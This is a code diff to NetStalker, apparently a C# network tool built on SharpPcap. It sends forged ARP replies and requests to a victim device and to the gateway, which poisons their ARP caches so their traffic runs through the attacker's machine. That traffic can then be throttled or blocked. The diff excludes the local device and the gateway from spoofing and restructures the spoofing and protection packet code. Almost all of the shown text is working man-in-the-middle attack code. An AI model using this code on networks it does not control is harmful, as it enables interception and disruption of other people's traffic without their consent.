@@ -1,9 +1,7 @@
 ﻿using PacketDotNet;
 using SharpPcap;
 using System;
-using System.Collections.Generic;
 using System.Linq;
-using System.Net;
 using System.Threading.Tasks;
 
 namespace NetStalker.MainLogic
@@ -60,7 +58,7 @@ namespace NetStalker.MainLogic
 
                         Device device;
 
-                        if ((device = Main.Devices.FirstOrDefault(D => D.Value.MAC.Equals(packet.SourceHardwareAddress)).Value) != null && device.Redirected)
+                        if ((device = Main.Devices.FirstOrDefault(D => D.Value.MAC.Equals(packet.SourceHardwareAddress)).Value) != null && device.Redirected && !device.IsLocalDevice && !device.IsGateway)
                         {
                             if (device.UploadCap == 0 || device.UploadCap > device.PacketsSentSinceLastReset)
                             {
@@ -74,7 +72,7 @@ namespace NetStalker.MainLogic
                         {
                             IPv4Packet IPV4 = packet.Extract<IPv4Packet>();
 
-                            if (Main.Devices.TryGetValue(IPV4.DestinationAddress, out device) && device.Redirected)
+                            if (Main.Devices.TryGetValue(IPV4.DestinationAddress, out device) && device.Redirected && !device.IsLocalDevice && !device.IsGateway)
                             {
                                 if (device.DownloadCap == 0 || device.DownloadCap > device.PacketsReceivedSinceLastReset)
                                 {
@@ -99,7 +97,7 @@ namespace NetStalker.MainLogic
         {
             foreach (var item in Main.Devices)
             {
-                if (item.Value.Blocked)
+                if (item.Value.Blocked && !item.Value.IsLocalDevice && !item.Value.IsGateway)
                 {
                     ConstructAndSendArp(item.Value, BROperation.Spoof);
                     if (AppConfiguration.SpoofProtection)
@@ -117,13 +115,30 @@ namespace NetStalker.MainLogic
         {
             if (Operation == BROperation.Spoof)
             {
-                ArpPacket ArpPacketForVicSpoof = new ArpPacket(ArpOperation.Response, device.MAC, device.IP, MainDevice.MacAddress, AppConfiguration.GatewayIp);
-                ArpPacket ArpPacketForGatewaySpoof = new ArpPacket(ArpOperation.Request, AppConfiguration.GatewayMac, AppConfiguration.GatewayIp, MainDevice.MacAddress, device.IP);
-                EthernetPacket EtherPacketForVicSpoof = new EthernetPacket(MainDevice.MacAddress, device.MAC, EthernetType.Arp)
+                ArpPacket ArpPacketForVicSpoof = new ArpPacket(ArpOperation.Request,
+                    targetHardwareAddress: device.MAC,
+                    targetProtocolAddress: device.IP,
+                    senderHardwareAddress: MainDevice.MacAddress,
+                    senderProtocolAddress: AppConfiguration.GatewayIp);
+
+                EthernetPacket EtherPacketForVicSpoof = new EthernetPacket(
+                    sourceHardwareAddress: MainDevice.MacAddress,
+                    destinationHardwareAddress: device.MAC,
+                    EthernetType.Arp)
                 {
                     PayloadPacket = ArpPacketForVicSpoof
                 };
-                EthernetPacket EtherPacketForGatewaySpoof = new EthernetPacket(MainDevice.MacAddress, AppConfiguration.GatewayMac, EthernetType.Arp)
+
+                ArpPacket ArpPacketForGatewaySpoof = new ArpPacket(ArpOperation.Request,
+                    targetHardwareAddress: AppConfiguration.GatewayMac,
+                    targetProtocolAddress: AppConfiguration.GatewayIp,
+                    senderHardwareAddress: MainDevice.MacAddress,
+                    senderProtocolAddress: device.IP);
+
+                EthernetPacket EtherPacketForGatewaySpoof = new EthernetPacket(
+                     sourceHardwareAddress: MainDevice.MacAddress,
+                     destinationHardwareAddress: AppConfiguration.GatewayMac,
+                     EthernetType.Arp)
                 {
                     PayloadPacket = ArpPacketForGatewaySpoof
                 };
@@ -131,17 +146,33 @@ namespace NetStalker.MainLogic
                 MainDevice.SendPacket(EtherPacketForVicSpoof);
                 if (device.Redirected)
                     MainDevice.SendPacket(EtherPacketForGatewaySpoof);
-
             }
             else
             {
-                ArpPacket ArpPacketForVicProtection = new ArpPacket(ArpOperation.Request, MainDevice.MacAddress, AppConfiguration.LocalIp, device.MAC, device.IP);
-                ArpPacket ArpPacketForGatewayProtection = new ArpPacket(ArpOperation.Request, MainDevice.MacAddress, AppConfiguration.LocalIp, AppConfiguration.GatewayMac, AppConfiguration.GatewayIp);
-                EthernetPacket EtherPacketForVicProtection = new EthernetPacket(device.MAC, MainDevice.MacAddress, EthernetType.Arp)
+                ArpPacket ArpPacketForVicProtection = new ArpPacket(ArpOperation.Response,
+                    targetHardwareAddress: MainDevice.MacAddress,
+                    targetProtocolAddress: AppConfiguration.LocalIp,
+                    senderHardwareAddress: device.MAC,
+                    senderProtocolAddress: device.IP);
+
+                EthernetPacket EtherPacketForVicProtection = new EthernetPacket(
+                   sourceHardwareAddress: device.MAC,
+                   destinationHardwareAddress: MainDevice.MacAddress,
+                   EthernetType.Arp)
                 {
                     PayloadPacket = ArpPacketForVicProtection
                 };
-                EthernetPacket EtherPacketForGatewayProtection = new EthernetPacket(AppConfiguration.GatewayMac, MainDevice.MacAddress, EthernetType.Arp)
+
+                ArpPacket ArpPacketForGatewayProtection = new ArpPacket(ArpOperation.Response,
+                   targetHardwareAddress: MainDevice.MacAddress,
+                   targetProtocolAddress: AppConfiguration.LocalIp,
+                   senderHardwareAddress: AppConfiguration.GatewayMac,
+                   senderProtocolAddress: AppConfiguration.GatewayIp);
+
+                EthernetPacket EtherPacketForGatewayProtection = new EthernetPacket(
+                   sourceHardwareAddress: AppConfiguration.GatewayMac,
+                   destinationHardwareAddress: MainDevice.MacAddress,
+                    EthernetType.Arp)
                 {
                     PayloadPacket = ArpPacketForGatewayProtection
                 };
